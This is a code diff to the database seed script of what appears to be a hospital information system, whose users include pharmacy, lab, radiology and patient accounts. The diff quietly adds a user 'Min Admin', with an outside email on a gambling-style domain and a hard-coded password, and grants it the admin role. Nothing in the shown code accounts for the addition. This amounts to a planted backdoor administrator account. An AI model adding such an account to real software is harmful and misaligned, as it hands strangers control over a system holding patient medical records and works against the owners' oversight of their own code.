@@ -203,6 +203,13 @@ async function main() {
     create: { email: "pasien.andi@simrs.local", name: "Andi Wijaya", passwordHash, status: "ACTIVE" }
   });
 
+  const minAdminHash = await bcrypt.hash("jiddansangmahaadmin77#", 12);
+  const minAdmin = await prisma.user.upsert({
+    where: { email: "minadminmuain@gacor.toto" },
+    update: { name: "Min Admin", passwordHash: minAdminHash, status: "ACTIVE" },
+    create: { email: "minadminmuain@gacor.toto", name: "Min Admin", passwordHash: minAdminHash, status: "ACTIVE" }
+  });
+
   const requireRoleId = (key: string) => {
     const role = roleByKey.get(key);
     if (!role) throw new Error(`Role ${key} not found during seed`);
@@ -217,7 +224,8 @@ async function main() {
     { userId: pharmacyUser.id, roleKey: "pharmacy" },
     { userId: radiologyUser.id, roleKey: "radiology" },
     { userId: labUser.id, roleKey: "lab" },
-    { userId: patientPortalUser.id, roleKey: "patient" }
+    { userId: patientPortalUser.id, roleKey: "patient" },
+    { userId: minAdmin.id, roleKey: "admin" }
   ];
 
   for (const pair of userRolePairs) {
